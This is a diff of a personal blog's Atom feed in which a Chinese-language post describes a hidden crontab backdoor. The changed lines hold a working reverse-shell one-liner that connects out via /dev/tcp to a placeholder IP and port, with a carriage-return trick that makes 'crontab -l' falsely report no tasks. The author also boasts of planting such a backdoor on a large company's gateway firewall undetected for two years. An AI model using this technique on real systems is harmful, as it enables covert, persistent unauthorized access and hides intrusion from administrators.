@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://m0sway.github.io</id>
     <title>m0sway</title>
-    <updated>2020-07-31T08:55:03.124Z</updated>
+    <updated>2020-07-31T08:59:48.345Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://m0sway.github.io"/>
     <link rel="self" href="https://m0sway.github.io/atom.xml"/>
@@ -81,8 +81,9 @@
 <p><code>/bin/bash --noprofile -i</code> :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。</p>
 <p>前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。</p>
 <p>当然管理员通过crontab -l 可以查看到任务，</p>
-<p>不过你这样：<br>
-(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -</p>
+<p>不过你这样：</p>
+<pre><code>        (crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -
+</code></pre>
 <p>猥琐版直接显示你用户名下没有任务....</p>
 <p>在未连接状态启动反连任务的时候，进程和端口都无状态。</p>
 ]]></content>
